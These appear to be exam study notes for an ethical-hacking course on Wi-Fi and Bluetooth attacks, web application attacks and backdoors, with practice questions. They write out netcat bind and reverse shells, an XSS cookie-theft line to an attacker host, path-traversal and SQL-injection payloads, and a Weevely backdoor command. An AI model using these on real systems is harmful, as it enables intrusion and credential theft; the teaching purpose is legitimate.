## 1. Wireless & Bluetooth Hacking

### 1.1 WLAN Core Components & Identifiers

| Component | Technical Role & Security Significance |
| :--- | :--- |
| **Access Point (AP)** | Central wireless hub connecting wireless LANs (WLANs) to a wired network. **Primary target** for wireless attackers. |
| **Router / Modem** | Modulates analog signals to encode/decode digital information and provides APs with Internet connectivity. Interconnects local WLAN devices and bridges communication across WLANs via APs. |
| **Wireless Adapter (WNIC)** | Wireless Network Interface Card; transmits and receives RF signals and communicates with other adapters within range. |
| **SSID** | **Service Set Identifier**; human-readable WLAN name configured on an AP as a unique, **1 to 32 character, case-sensitive alphanumeric** string. Broadcast several times per second; one AP can beacon multiple SSIDs. |
| **BSSID** | **Basic Service Set Identifier**; the **48-bit MAC address** of the Access Point. |

#### Management Frames: Probes vs. Beacons
* **Beacon Frames:** Periodically transmitted by APs to announce their presence and advertise network parameters (**MAC address, SSID, authentication type, encryption standard**).
  * *Reconnaissance Tool:* **Vistumbler** captures and displays AP beacon metadata.
* **Probe Request Frames:** Sent by a client station when actively scanning to discover which APs are within range.

---

### 1.2 Rogue APs & Evil Twin Attacks

> [!important] Core Distinction (MCQ/Descriptive)
> * **Rogue AP:** An **unmanaged/unauthorized AP** physically or logically attached to an enterprise network (e.g., an employee plugging in a router or running **Connectify** to share Internet), creating an unmonitored backdoor into the wired LAN.
> * **Evil Twin:** A **fake AP** set up by an attacker that mimics a legitimate AP's **SSID, MAC address, and security settings** with a stronger RF signal to trick clients into connecting to it instead of the real AP.

#### Rogue AP Attack Surface & Defenses
* **Wired Infrastructure Attacks Enabled by Rogue APs:** ARP poisoning, DHCP attacks, Spanning Tree Protocol (STP) attacks, DoS attacks, internal network mapping/scanning, Man-in-the-Middle (MITM), and packet sniffing.
* **Defenses Against Rogue APs:**
  * **Network Access Control (NAC):** Restricts unauthorized devices, though not completely effective on its own because it is vulnerable to **MAC address spoofing**.
  * **Periodic Manual RF Surveys:** Scheduled physical sweeps using wireless scanners to detect unauthorized signals.

#### Evil Twin Attack Mechanics (Step-by-Step)
1. **Reconnaissance:** Attacker sniffs wireless traffic to capture the target trusted AP's **SSID** (easily obtained if beacons are enabled).
2. **Deployment:** Attacker configures a fake AP with the identical SSID (and optionally spoofs the legitimate AP's MAC address) without authentication.
3. **Signal Overpowering:** Attacker boosts transmit power so the Evil Twin presents a **stronger signal** than the legitimate AP (does not need to be in the exact same physical spot).
4. **Client Association:** Because client WNICs automatically connect to the AP with the strongest signal, victims associate with the Evil Twin (public Wi-Fi hotspots are prime targets).
5. **Traffic Interception:** Attacker gains full MITM visibility to sniff credentials and sensitive data.

> [!warning] Root Cause Vulnerability of Evil Twins
> Standard IEEE 802.11 uses **one-way authentication**: the AP authenticates the client user, but **the client does not authenticate the AP**, preventing users from verifying whether an AP is legitimate.

---

### 1.3 MAC Address Structure & Spoofing

* **Format:** Unique **48-bit** hardware identifier written as 6 hexadecimal pairs (e.g., `00:04:52:03:3c:0f`).
  * **First 3 hex bytes (`00:04:52`):** OUI (Organizationally Unique Identifier / vendor ID).
  * **Last 3 hex bytes (`03:3c:0f`):** Device serial number.

#### How to Spoof a MAC Address
1. **Windows Device Manager:** `Control Panel > View network > Change adapter settings` $\rightarrow$ Properties $\rightarrow$ Configure $\rightarrow$ Advanced $\rightarrow$ Network Address. *(Note: Locally administered MACs typically start with `02`, e.g., `02:e9:84:0c:8f:21`).*
2. **Windows Registry:** Modify the `NetworkAddress` registry key under the network adapter class.
3. **Windows Tool:** **Technitium MAC Address Changer**.
4. **Linux CLI (`macchanger`):**

```bash
macchanger -s eth0                  # Show current MAC address
macchanger -a eth0                  # Set random vendor MAC of the SAME hardware kind
macchanger -A eth0                  # Set random vendor MAC of ANY kind
macchanger -m 02:e9:84:0c:8f:21 eth0 # Set a specific custom MAC address
macchanger -p eth0                  # Reset to permanent (burned-in) MAC address
macchanger -b eth0                  # Pretend to be a burned-in address
```

#### Attacker Use Cases for MAC Spoofing (MSQ Checklist)
* **AP Honeypot:** Configure a fake AP with a legitimate AP's MAC to divert traffic for MITM and replay attacks.
* **Rogue Soft AP:** Convert a laptop/Wi-Fi card into a software AP (using **Connectify**, **Virtual WiFi Router**, **MyPublicWiFi**, or **My WiFi Router**), broadcast a spoofed SSID and MAC, and harvest credentials.
* **Bypassing MAC Address Filtering:** APs or RADIUS servers maintain an allowlist of permitted MAC addresses. Because MAC headers are transmitted in **cleartext** over wireless frames, an attacker simply sniffs an authorized client's MAC and spoofs it.

---

### 1.4 Wi-Fi Security Standards Comparison (WEP, WPA, WPA2, WPA3)

| Feature | WEP | WPA | WPA2 (802.11i / RSN) | WPA3 |
| :--- | :--- | :--- | :--- | :--- |
| **Cipher** | **RC4** | **RC4** (with **TKIP**) | **AES-CCMP** | **AES-GCMP / CCMP** |
| **Key Size** | **40-bit** or **104-bit** secret key | **128-bit** key | **128-bit** (256-bit PSK) | **128-bit** / **192-bit** (Enterprise) |
| **IV / Nonce Size** | **24-bit IV** | **48-bit IV** (24-bit IV + 24-bit Extended IV) | **48-bit Packet Number (PN)** | **48-bit PN** |
| **Integrity Check** | **32-bit ICV** (CRC-32) | **64-bit MIC** (**Michael** algorithm) + ICV | **CBC-MAC** (part of CCMP) | **GMAC / CBC-MAC** |
| **Handshake / Auth** | Open / Shared Key | PSK or 802.1X | PSK or 802.1X (4-Way Handshake) | **SAE** (Simultaneous Authentication of Equals) |

#### Detailed Protocol Mechanics & Limitations

##### 1. WEP (Wired Equivalent Privacy)
* **Encryption Formula:**
  $$C = [M + \text{ICV}(M)] \oplus [\text{RC4}(\text{WEP Key} + \text{IV})]$$
  *(where $C$ is ciphertext, $M$ is plaintext, $\text{ICV}(M)$ is the 32-bit checksum, and $\oplus$ denotes bitwise XOR).*
* **WEP Limitations (MSQ):**
  * **Weak Key Management & Size:** Typically uses 1 to 4 static shared keys that are rarely changed; vulnerable to rapid dictionary attacks.
  * **Short 24-bit IV:** Causes frequent **IV reuse**, producing identical RC4 keystreams (multiple adapters can also generate overlapping IVs).
  * **Cleartext IV:** The 24-bit IV is transmitted in cleartext and concatenated directly with the static WEP key to form the RC4 seed.
  * **Unprotected Headers:** The 32-bit ICV only protects payload integrity, **not the 802.11 packet header**.

##### 2. WPA (Wi-Fi Protected Access)
* **TKIP (Temporal Key Integrity Protocol):** Designed as an interim software patch for WEP hardware. Dynamically generates a unique key per packet:
  1. **Key Mixing Function** combines: `Temporary Encryption Key (Base WPA Key)` + `Transmitter MAC Address` + `48-bit Sequence Counter (IV)` $\rightarrow$ outputs a **New Per-Packet Key**.
  2. **RC4 Cipher** takes the `New Key` + `IV` $\rightarrow$ generates the **Keystream** to XOR with `[Complete Data Packet + 64-bit MIC + Fragmented ICV]`.
* **Integrity & Anti-Replay:** Uses **Michael's Algorithm** to compute a **64-bit MIC** (placed before the ICV) combined with a frame counter to block replay attacks.
* **Authentication Modes:**
  * *Personal (PSK):* Every user shares the same passphrase; uses TKIP (homes/small offices).
  * *Enterprise (IEEE 802.1X):* Server distributes unique keys to each user (business/gov/education).
* **WPA Limitations (MSQ):**
  * PSK uses a single shared passphrase with no standardized key rotation mechanism $\rightarrow$ vulnerable to eavesdropping and offline dictionary attacks.
  * Vulnerable to Denial of Service (DoS).
  * TKIP still relies on RC4 and is vulnerable to the **Beck-Tews keystream recovery attack** (decrypts small packets like ARP/DNS, compromising confidentiality).
![[Pasted image 20261113111651.png]]

##### 3. WPA2 (Robust Security Network — RSN)
* **Encryption:** **AES-CCMP** (Counter Mode Cipher Block Chaining Message Authentication Code Protocol).
* **IEEE 802.1X Authentication Flow (3 Actors: Client, Access Point, Authentication Server / RADIUS):**
  1. **AP $\rightarrow$ Client:** AP sends an `EAP Request-Identity` frame.
  2. **Client $\rightarrow$ AP:** Client responds with its identity and preferred authentication method.
  3. **AP $\rightarrow$ AS:** AP relays the client's response to the Authentication Server (RADIUS).
  4. **Client $\leftrightarrow$ AS:** EAP messages are exchanged between Client and AS to mutually authenticate and derive a shared **Master Key (MK)**.
  5. **AS $\rightarrow$ AP:** Upon completion, AS sends a `RADIUS Access-Accept` message to the AP containing the **MK**.
  6. **AP $\rightarrow$ Client:** AP sends a final `EAP-Success` message to the client.
* **WPA2 Key Hierarchy:**
  * **PMK (Pairwise Master Key):**
    * *WPA2-Personal:* Derived from `256-bit PSK + SSID + SSID Length`.
    * *WPA2-Enterprise:* Derived from the `MK` generated during 802.1X authentication.
  * **PTK (Pairwise Transient Key):** Derived during the 4-way handshake between Client and AP; encrypts/decrypts **unicast** traffic between that specific client and AP.
  * **GTK (Group Temporal Key):** Created during the Client-AP exchange in both Personal and Enterprise modes; encrypts/decrypts **multicast and broadcast** traffic.
* **WPA2 Limitations (MSQ):**
  * Vulnerable to physical-layer attacks (RF jamming, data flooding, AP hardware failure).
  * Vulnerable to DoS and Layer 2 session hijacking.
  * **Unprotected control and management frames** (e.g., spoofed deauthentication frames).
  * Vulnerable to AP spoofing attacks (in Enterprise mode, the attacker must first be an authenticated client).

##### 4. WPA3
* Replaces the vulnerable 4-way handshake key exchange with **SAE (Simultaneous Authentication of Equals)**, making passive eavesdropping ineffective.
* Prevents offline brute-force/dictionary attacks by limiting an attacker to **one password guess per online interaction**.

---

### 1.5 WPA2 KRACK (Key Reinstallation Attack)

> [!important] How KRACK Works (Descriptive Exam Favorite)
> KRACK does **not** crack or brute-force the Wi-Fi password. Instead, it manipulates the **WPA2 4-Way Handshake** to force the client to **reinstall an already-in-use key and reset its transmit Nonce (packet counter)**, causing **keystream reuse** across all WPA2 ciphers (allowing decryption and packet replay/forgery).

1. **Msg 1 (AP $\rightarrow$ Client):** AP sends `ANonce` (Authenticator Nonce) to the client.
2. **Msg 2 (Client $\rightarrow$ AP):** Client sends `SNonce` (Supplicant Nonce) to the AP; both sides derive the **PTK**.
3. **Msg 3 (AP $\rightarrow$ Client):** AP sends encrypted Msg 3. Upon receiving Msg 3, the client **installs the PTK and GTK** and replies with Msg 4.
4. **MITM Interception:** The attacker blocks **Msg 4** before it reaches the AP.
5. **Retransmission:** Because the AP did not receive Msg 4, it assumes Msg 3 was lost and retransmits a **duplicate Msg 3** to the client.
6. **Key Reinstallation & Nonce Reset:** When the client receives the duplicate Msg 3, it **reinstalls the PTK/GTK** and **resets its transmit packet counter (Nonce)** back to its initial value.
7. **Keystream Reuse:** Subsequent data frames sent by the client are encrypted with the exact same `(PTK, Nonce)` pair used earlier, reusing the identical keystream and allowing the attacker to decrypt frames.

---

### 1.6 Wireless Attacking Techniques, CIA Tool Matrix & Defenses

#### Attack Techniques & Reconnaissance
* **Wardriving / Warflying:** Discovering WLANs by passively listening to beacons or sending probes while moving (Warflying uses a drone). *Legal note: Discovering WLANs is not illegal; exploiting discovered network resources is illegal.*
  * *Wardriving Tools:* `Airmon-ng`, `DStumbler`, `KisMAC`, `MacStumbler`, `NetStumbler`, `Vistumbler`, `Wellenreiter`, `WiFiFoFum`.
* **DoS / DDoS:** Flooding a target's request queue with fake requests so legitimate traffic cannot be processed (DDoS uses a zombie botnet).
  * *DoS Tools:* `HOIC`, `LOIC`, `XOIC`, `HULK`, `GoldenEye`.
* **RF Jamming:** Overpowering wireless frequencies with a strong radio signal to cut off AP/client communication (deliberate or unintentional; expensive/rare). Detected using a spectrum analyzer (e.g., *My WiFi Zone Internet Access Blocker 5.0*).
* **Wireless Sniffing:** Configuring a WNIC in **RF Monitor Mode** and **Promiscuous Mode** to capture packets passively without associating with an AP.
  * *Windows CLI Scan:* `netsh wlan show networks mode=bssid`
* **Key Cracking:** Capturing handshakes/IVs to recover WEP/WPA/WPA2 keys (`Aircrack-ng`, `airoway`, `AirSnort`, `Wireshark`, `CommView`).

#### CIA Triad Wireless Tool Classification (MCQ Table)

| CIA Pillar | Tool Name(s) | Specific Function |
| :--- | :--- | :--- |
| **Confidentiality** | `AirSnort` | Brute-force WEP encryption cracker |
| **Confidentiality** | `Aircrack` (`Aircrack-ng`) | WPA / WEP encryption cracker |
| **Confidentiality** | `Ettercap`, `dsniff`, `Wireshark` | Wireless/network packet sniffers |
| **Confidentiality** | `Hotspotter`, `apsniff`, `aphunter`, `KNSGEM` | WLAN discovery / AP locators (listens for beacons) |
| **Confidentiality** | `HermesAP`, `OpenAP` | Sets up Rogue AP / Evil Twin |
| **Confidentiality** | `OpenWRT`, `HyperWRT` | Replacement AP firmware used to create fake APs and launch attacks |
| **Integrity** | `Airpwn` | Generic 802.11 packet injection |
| **Integrity** | `File2air` | Injects a specified file as an 802.11 packet payload (replay) |
| **Integrity** | `Airjack`, `Simple-replay` | Re-injects previously captured 802.11 packets (replay attack) |
| **Availability** | `FakeAP` | Generates massive floods of fake 802.11 beacon frames |
| **Availability** | `Void11` | Executes deauthentication, authentication, and association flooding attacks |

#### Bluetooth Attack Tools (MCQ Table)

| Tool | Attack Mechanism |
| :--- | :--- |
| **BlueSmack** | Sends oversized L2CAP echo packets (Bluetooth **Ping of Death** DoS attack) |
| **BlueChop** | Disrupts an active Bluetooth **piconet** |
| **BluePass** | Triggers a **buffer overflow** on a target Bluetooth device |
| **BlueSnarf** | Gains **unauthorized access to files/data** (contacts, calendars, files) |
| **BlueBump** | Tricks a device into leaking/obtaining the **piconet link key** |

> [!tip] Wi-Fi Security Hardening Checklist
> 1. Change default router administrative login credentials.
> 2. Enforce **WPA2 (AES-CCMP)** or **WPA3**; never use WEP.
> 3. Keep router/AP firmware updated.
> 4. Enable MAC address filtering on the AP/router.
> 5. Change the default SSID and disable SSID broadcast.
> 6. Apply physical RF shielding/attenuation to prevent wireless signals from leaking outside the building perimeter.
> 7. Power off routers and APs when not in use.

> [!question]- Practice Check: Module 1 (Wireless & Bluetooth)
> **1. (MCQ)** Which wireless attack tool is classified as an **Integrity** attacking tool that injects a specified file as an 802.11 packet payload?
> * A) `Void11`
> * B) `File2air`
> * C) `AirSnort`
> * D) `Hotspotter`
>
> **2. (MSQ)** Which of the following are valid limitations of **WPA2**? *(Select all that apply)*
> * A) Vulnerable to RF jamming and physical-layer attacks
> * B) Unprotected control and management frames
> * C) Uses a 24-bit IV that causes rapid keystream reuse
> * D) Vulnerable to AP spoofing if the attacker is an authenticated client in Enterprise mode
>
> **3. (Descriptive)** Explain how the **WPA2 KRACK** attack forces keystream reuse without brute-forcing the network passphrase.
>
> ---
> **Answers:**
> 1. **B** (`File2air` is an Integrity replay tool; `Void11` is Availability; `AirSnort` and `Hotspotter` are Confidentiality).
> 2. **A, B, D** (C describes WEP, not WPA2).
> 3. During the 4-way handshake, the client installs the PTK/GTK upon receiving Msg 3 and sends Msg 4. The attacker blocks Msg 4, causing the AP to retransmit duplicate Msg 3. When the client processes duplicate Msg 3, it reinstalls the PTK/GTK and resets its transmit packet counter (Nonce) to its initial value, causing subsequent frames to be encrypted with a reused keystream.

---

## 2. Web Application Hacking

### 2.1 Web Architecture & Attack Surface
![[Pasted image 20261113111742.png]]

 **Attacker Motivations:** Political/Hacktivism, Business Competition, Angry/Disgruntled Users, Ransom/Financial Gain.
* **Why Web Apps Are Primary Targets:** Network firewalls block OS-level exploits (e.g., WU-FTPD, Sun RPC, NT `IPC$`), but **Ports 80 (HTTP) and 443 (HTTPS)** must remain open for web traffic, creating a direct path ("hole in the firewall" / HTTP tunneling) into the web application layer, which is typically less hardened than the underlying OS/web server.
* **URL Anatomy:** `http://user:password@www.commentcamarche.net:80/glossair`
  * `http`: Protocol 
	- `user:password`: Credentials (insecure—sent in cleartext)
  -  `www.commentcamarche.net`: Server hostname
	-  `80`: Service port 
  -  `/glossair`: Resource path.
- Techniques: 
	- Malware
	- Password attack
	- eavesdropping
	- phishing
	- man in the middle
	- drive by attack
	- birthday attack
	- sqli
	- dos and ddos
	- xss

---

### 2.2 Web Footprinting, Enumeration & Scanning

#### Manual & Automated Enumeration
* **Manual Inspection:** 
  - Explore visible workflows (login, forms, search boxes, file uploads)
  - record all `GET`/`POST` parameters, map internal/external/anchor/`mailto:` links
  - check URL patterns for hidden directories
  - and inspect HTML source code.
  
* **Tools:**
  * **`WhatWeb`** (`whatweb -v <target>`): Fingerprints web servers, CMS platforms, frameworks, and scripting languages.
  * **`Dig`** (Domain Information Groper): Performs DNS queries and reverse DNS lookups.
  * **Burp Suite / Browser HTTP Header Plugins:** Intercepts, inspects, and modifies HTTP requests/responses (MITM proxy, brute-forcing, parameter tampering).
  * **`HTTrack`:** Mirrors/downloads an entire website locally for offline source and structure analysis.
  * **`wafw00f`:** Detects and identifies Web Application Firewalls (WAFs) protecting a target.

> [!example]- Lab Walkthrough: Scanning OWASP Juice Shop with Metasploit `wmap`
> ```bash
> # 1. Start OWASP Juice Shop container on port 3000
> sudo systemctl enable docker && sudo systemctl start docker
> docker run --rm -p 3000:3000 bkimminich/juice-shop
>
> # 2. Initialize Metasploit database and launch wmap scanner
> sudo systemctl status postgresql
> sudo systemctl enable postgresql
> sudo msfdb init
> msfconsole
> load wmap
> wmap_sites -a http://127.0.0.1:3000
> wmap_targets -t http://127.0.0.1:3000
> wmap_targets -l                        # List defined targets
> wmap_run -e                            # Execute vulnerability scan
> wmap_vulns -l                          # List discovered vulnerabilities
> ```

---

### 2.3 URL Attacks & Directory (Path) Traversal

* **URL Interpretation Attacks:** Exploits web server URL parsing quirks to bypass restrictions (e.g., `deturl.com/www.youtube.com/video` to bypass download blocks).
* **Hidden Paths (`robots.txt`):** Located at `http://<target>/robots.txt`. Instructs search engine crawlers which paths *not* to index, inadvertently disclosing sensitive admin or backup directories to attackers.
* **Directory / Path Traversal:** Uses dot-dot-slash sequences (`../` on Unix/Kali, `..\` on Windows) to escape the web root directory and read arbitrary system files (e.g., `/etc/passwd`, `/etc/shadow`, `/etc/master.passwd`, `../apache/logs/access.log`).

#### Path Traversal Filter Bypass Encodings (MSQ Checklist)

| Bypass Technique | Payload / Encoding Example | How It Defeats Validation |
| :--- | :--- | :--- |
| **URL-Encoded Null Byte** | `../../etc/passwd%00.jpg` | Bypasses hardcoded extension checks (`.jpg` passes regex/suffix check, while underlying C-based file APIs terminate string reading at `%00`). |
| **Newline Injection** | `%0a` (`\n`) | Tricks multi-line regex path validators into approving the path. |
| **Standard URL Encoding** | `%2e%2e%2f` (`../`) or `%5c` (`\`) | Bypasses literal string blacklists looking for `../`. |
| **Double URL Encoding** | `%252e%252e%252f` (`%25` = `%`) | Defeats filters that decode input once before checking, but the backend decodes a second time. |
| **16-Bit Unicode Encoding** | `%u002e` (`.`) | Bypasses ASCII-only signature filters on IIS/Unicode-aware servers. |
| **Overlong UTF-8 Encoding** | `%c0%2e` or `%e0%40%ae` (`.`) | Exploits non-shortest-form UTF-8 decoders to reconstruct `.` after filter checks. |

---

### 2.4 SQL Injection (SQLi)

> [!important] Definition & 6-Step Execution Lifecycle
> **SQL Injection** occurs when untrusted user input is concatenated directly into a backend database query without proper input validation or parameterized escaping, allowing an attacker to alter the SQL command structure.
> 1. Application presents an input form to the user.
> 2. Attacker submits crafted SQL exploit syntax in the form.
> 3. Application builds the SQL query string containing the raw input.
> 4. Application sends the query to the database interpreter.
> 5. Database executes the injected SQL logic and returns results.
> 6. Application displays the leaked data or grants unauthorized access.

#### Authentication Bypass Payloads & Edge Cases
![[Pasted image 20261113112504.png]]
* **Basic Quote & Comment Bypass:**
  * Input: `vivek' --` $\rightarrow$ `SELECT * FROM users WHERE username = 'vivek' --' AND password = '123'` (logs in specifically as `vivek` without knowing the password; `--`, `#`, and `/* */` comment out the remainder of the query).
  * Input: `' OR 1=1 --` $\rightarrow$ Condition evaluates to `TRUE` for all rows, typically logging in as the first user in the table (often `admin`).
* **Balancing Parentheses:**
  * Vulnerable Query: `SELECT * FROM users WHERE email = '$email' AND (password_hash = '$password') LIMIT 1`
  * Payload: `' OR 0=0) #` $\rightarrow$ Closes the open parenthesis `)` before `#` comments out the rest, preventing a syntax error.
* **MD5 / Function Wrapper Bypass:**
  * Vulnerable Query: `SELECT * FROM users WHERE email = '$email' AND password = md5('$password');`
  * Payload: `xxx') OR 1=1 --` $\rightarrow$ Closes both `'` and `)` of `md5(...)` and appends `OR 1=1`.
* **Numeric Field Injection:**
  * Vulnerable Query: `WHERE user_id = $id` $\rightarrow$ No single quotes wrap `$id`, so inject `1 OR 1=1` directly without quotes.
* **Bypassing Blocked Comment Characters (`--`, `#`, `/*`):**
  * Payload: `' OR 'a'='a` $\rightarrow$ Result: `WHERE username = '' OR 'a'='a' AND password = '...'` (the query's own trailing single quote balances the string cleanly without needing comments).

#### Step-by-Step `UNION SELECT` Database Enumeration (Descriptive Guide)

| Step  | Goal                               | MySQL Payload Example                                                                                              | SQLite (OWASP Juice Shop) Payload                                                          |
| :---- | :--------------------------------- | :----------------------------------------------------------------------------------------------------------------- | :----------------------------------------------------------------------------------------- |
| **1** | **Find Column Count** (`ORDER BY`) | `page.php?cat=1 ORDER BY 11` (works)<br>`page.php?cat=1 ORDER BY 12` (fails $\rightarrow$ **11 cols**)             | `?q=s') ORDER BY 9 --` (works)<br>`?q=s') ORDER BY 10 --` (fails $\rightarrow$ **9 cols**) |
| **2** | **Find Displayable Column**        | `cat=-1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11` (e.g., `11` renders on page)                                         | `?q=s') UNION SELECT 1,2,3,4,5,6,7,8,9 --` (e.g., `2` renders in name field)               |
| **3** | **Fingerprint DB Version**         | `cat=-1 UNION SELECT 1..10, @@version`                                                                             | `?q=s') UNION SELECT 1, sqlite_version(), 3..9 --`                                         |
| **4** | **Enumerate Table Names**          | `cat=-1 UNION SELECT 1..10, group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()` | `?q=s') UNION SELECT 1, name, 3..9 FROM sqlite_master WHERE type='table' --`               |
| **5** | **Enumerate Column Names**         | `cat=-1 UNION SELECT 1..10, group_concat(column_name) FROM information_schema.columns WHERE table_name='users'`    | `?q=s') UNION SELECT 1, sql, 3..9 FROM sqlite_master WHERE name='Users' --`                |
| **6** | **Extract Credentials**            | `cat=-1 UNION SELECT 1..10, concat(uname,0x3a,pass,0x3a,email,0x3a,name) FROM users` *(Note: `0x3a` is `:`)*       | `?q=s') UNION SELECT id, email, password, '4','5','6','7','8','9' FROM Users --`           |

* **SQLi Impacts:** 
	  - Leakage of sensitive data, 
	  - unauthorized modification/deletion of data, 
	  - loss of reputation, 
	  - full database server takeover, 
	  - and Denial of Service.
* **SQLi Tools:** **SQLi Hunter** (discovers vulnerable sites via Google Dorks) and **SQLmap** (automates SQLi detection and database takeover).

---

### 2.5 Cross-Site Scripting (XSS) & Cross-Site Request Forgery (CSRF)

#### XSS Capabilities
When an attacker executes arbitrary JavaScript inside a victim's browser session, they can perform:
1. **Cookie / Session Hijacking:** Exfiltrate `document.cookie` via `window.location='http://attacker/?cookie='+document.cookie`.
2. **Keylogging:** Attach an `addEventListener` keyboard listener to transmit every keystroke to the attacker's server.
3. **Phishing via DOM Manipulation:** Dynamically inject a fake login form whose `action` submits credentials to the attacker.

#### Comparison of the 3 Types of XSS (Descriptive / MCQ)

| XSS Type | Where Payload Lives | Execution Flow | Visibility to Web Server |
| :--- | :--- | :--- | :--- |
| **1. Persistent (Stored) XSS** | Stored permanently in the **website's database** (e.g., comment section, user profile). | 1. Attacker `POST`s `<script>` to vulnerable form.<br>2. DB saves payload.<br>3. Victim requests the page (`GET`).<br>4. Server embeds stored script in response; victim's browser executes it and sends cookies to attacker. | **Visible** (stored on server and sent in HTTP response). |
| **2. Reflected XSS** | Embedded inside a **crafted URL** (or hidden `<iframe>` on a malicious site). | 1. Attacker tricks victim into clicking malicious URL (`search?keyword=<script>...`).<br>2. Victim browser sends `GET` request to vulnerable site.<br>3. Server immediately reflects the input in its HTML response.<br>4. Victim browser executes script. | **Visible** (sent in HTTP request and echoed in HTTP response). |
| **3. DOM-Based XSS** | Processed strictly **client-side** in the browser's Document Object Model (e.g., `location.search`). | 1. Victim clicks crafted URL.<br>2. Server returns legitimate page **without** the payload.<br>3. Victim's browser runs page's legitimate JS (e.g., `innerHTML = location.search.substring(6)`), inserting the malicious script into the DOM.<br>4. Browser executes injected script. | **Invisible to the server** (payload never touches server-side response generation; fragment `#` isn't even sent to server). |

#### Cross-Site Request Forgery (CSRF / XSRF)
* **Mechanism:** Exploits the trust a web application has in a **victim's authenticated browser**.
* **4-Step CSRF Lifecycle:**
  1. Victim logs into the vulnerable website (`testphp.vulnweb.com`) and maintains an active session cookie.
  2. Victim is tricked into visiting a malicious webpage controlled by the attacker.
  3. The malicious webpage contains a hidden `<iframe>` with an auto-submitting form (`<body onload="document.getElementById('f').submit()">`) pre-populated with the attacker's desired values (e.g., changing email, address, or credit card).
  4. The victim's browser automatically submits the forged `POST` request along with the victim's valid session cookie, executing the unauthorized action without user consent.

> [!question]- Practice Check: Module 2 (Web Application Hacking)
> **1. (MCQ)** Which encoding sequence represents a **URL-encoded NULL byte** used to bypass hardcoded file extension checks during a path traversal attack?
> * A) `%0a`
> * B) `%252e`
> * C) `%00`
> * D) `%u002e`
>
> **2. (MSQ)** Which statements accurately distinguish **DOM-Based XSS** from **Reflected XSS**? *(Select all that apply)*
> * A) DOM-Based XSS occurs entirely client-side when legitimate JavaScript writes untrusted DOM data into an unsafe sink like `innerHTML`
> * B) The server's HTTP response in DOM-Based XSS does not contain the malicious payload
> * C) DOM-Based XSS stores the malicious script permanently inside the backend SQL database
> * D) DOM-Based XSS is invisible to server-side response inspection
>
> **3. (Descriptive)** Given the vulnerable SQL query `SELECT * FROM users WHERE email = '$email' AND (password_hash = '$password') LIMIT 1`, explain why injecting `' OR 1=1 #` causes a syntax error and provide a working payload.
>
> ---
> **Answers:**
> 1. **C** (`%00` is the NULL byte; `%0a` is newline; `%252e` is double-encoded `.`; `%u002e` is 16-bit Unicode `.`).
> 2. **A, B, D** (C describes Persistent/Stored XSS).
> 3. Injecting `' OR 1=1 #` comments out the closing parenthesis `)` already present in the query, leaving an unbalanced opening parenthesis `(`. A working payload is `' OR 0=0) #`, which closes the parenthesis before commenting out the remainder of the query.

---

## 3. Maintaining Access (Backdoors, Trojans, Rootkits & Keyloggers)

### 3.1 Backdoors: Sniffing Backdoors & Netcat (`nc`)

A **backdoor** is a covert entry mechanism installed on a compromised host (or resulting from a vulnerability) that bypasses normal authentication. Heavily used in Advanced Persistent Threats (APTs).

#### Sniffing Backdoors (Stealthy Activation)
Unlike standard backdoors that leave a port constantly open in `LISTENING` state (easily spotted by `netstat` or port scans), **sniffing backdoors** passively inspect network packets:
* **Non-Promiscuous Sniffing Backdoor (e.g., `cd00r`):**
  * Sniffs traffic destined **only for the target machine**.
  * Watches for a predefined **port-knocking sequence** of TCP SYN packets hitting ports $X \rightarrow Y \rightarrow Z$.
  * Only after receiving the SYN packet on final port $Z$ does `cd00r` open a temporary listening port (e.g., port `5002`).
* **Promiscuous Sniffing Backdoor:**
  * Sniffs **all traffic across the LAN** (e.g., placed on a DNS server to watch traffic aimed at a WWW server; often paired with **ARP cache poisoning** on switched networks to divert traffic), making forensic investigation difficult.

#### Netcat (`nc`) Backdoor Commands ("Swiss Army Knife for Hackers")

> [!important] Netcat Flag Note (`-nlvp` vs. `-lvp`)
> Including **`-n`** disables DNS and reverse-DNS lookups, making connections faster and preventing suspicious DNS queries on the victim network.

```bash
# 1. Simple Chat / Raw Connection
nc -nlvp 6666                         # Victim listens on TCP port 6666
nc -nv <victim_ip> 6666               # Attacker connects to port 6666

# 2. File Transfer (Pushing malware to victim)
nc -nlvp 6666 > store.out             # Victim listens and redirects input to file
nc -nv <victim_ip> 6666 < malicious_file  # Attacker sends file

# 3. Bind Shell (Victim opens shell on listening port)
nc -nlvp 6666 -e /bin/sh              # Linux victim (use -e cmd.exe on Windows)
nc -nv <victim_ip> 6666               # Attacker connects to receive shell

# 4. Reverse Shell (Victim connects outbound to attacker — bypasses ingress firewalls)
nc -lvp 4444                          # Attacker listens on port 4444
nc 192.168.1.1 4444 -e /bin/sh        # Victim initiates connection to attacker IP
```

---

### 3.2 Trojans, RATs & Rootkits

* **Trojan Horse:** Malware disguised as a legitimate program (named after the Greek wooden horse). Goals: remote control, data theft, and downloading additional malware.
* **ProRAT:** A well-known **Remote Access Trojan (RAT)**; generates a server executable that disables antivirus/firewall protections upon installation and grants full remote control.
* **EXE Wrappers:** Bundle a trojan executable inside a legitimate installer so both extract and run silently (may trigger heuristic AV false positives).
* **Weevely (PHP Web Backdoor):**
  ```bash
  python weevely.py generate 123 agent.php   # Generate obfuscated PHP backdoor with password '123'
  # Upload agent.php to web server root (e.g., xampp/htdocs), then connect via weevely.py
  ```

#### Trojan & Rootkit Classification Matrix (MCQ / Descriptive)

| Category | Mechanism & Behavior | Analogy | Example Tools |
| :--- | :--- | :--- | :--- |
| **Application-Level Trojan Backdoor** | Runs as a **separate user-space program** providing remote backdoor access. Least stealthy; easiest to detect. | Attacker adds poison to your soup. | `Sub7`, `BO2K` (Back Orifice 2000), `Tini` |
| **Traditional Rootkit** | **Replaces critical OS utilities/binaries** (`ls`, `ps`, `dir`, `ifconfig`, `login`) with trojanized versions so they hide malicious files/processes. | Attacker replaces your noodles with poisoned ones. | `LRK6`, `T0rnkit` |
| **Kernel-Level Rootkit** | Leaves user-space commands (`ls`, `ps`, `du`, `ifconfig`) **unmodified**, but **modifies the OS kernel itself** to intercept system/API calls, hide processes/files/network sockets, and redirect execution. | Attacker replaces your tongue with a poisoned one. | `Knark`, `Adore`, `rootkit.com` |

* **3 Implementation Methods for Kernel-Level Rootkits (MSQ):**
  1. **Loadable Kernel Module (LKM)** loaded into the running kernel.
  2. **Patching the kernel image** directly on the hard drive.
  3. **Altering the kernel in memory** on a live running system.
